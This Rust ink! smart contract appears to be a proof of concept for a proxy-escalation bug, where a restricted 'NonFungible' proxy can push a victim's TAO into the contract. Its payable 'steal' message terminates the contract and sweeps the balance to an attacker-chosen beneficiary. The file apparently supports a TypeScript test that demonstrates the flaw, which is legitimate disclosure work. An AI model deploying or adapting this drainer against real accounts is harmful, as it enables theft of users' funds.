#![cfg_attr(not(feature = "std"), no_std, no_main)]

//! Minimal attacker contract used to demonstrate the proxy-escalation bug.
//!
//! `Contracts::call { dest, value }` debits `value` from the *origin*. Under
//! `Proxy::proxy { real }`, the origin is the victim — so a `NonFungible`
//! proxy (documented as unable to move TAO) can push the victim's free balance
//! into this contract. A non-payable message would trap and roll the value
//! back, so `steal` is `payable`: it accepts the pushed value and immediately
//! terminates, forwarding the contract's entire balance to `beneficiary`.
//!
//! Explicit selectors are set so the TypeScript test can hand-encode the call
//! without parsing the generated metadata.
#[ink::contract]
mod drainer {
    #[ink(storage)]
    pub struct Drainer {}

    impl Drainer {
        #[ink(constructor, selector = 0x11111111)]
        pub fn new() -> Self {
            Self {}
        }

        /// Payable sink: accept the proxied (victim-funded) value and sweep the
        /// contract's whole balance to `beneficiary` via self-termination.
        #[ink(message, payable, selector = 0xdeadbeef)]
        pub fn steal(&mut self, beneficiary: AccountId) {
            self.env().terminate_contract(beneficiary);
        }
    }
}
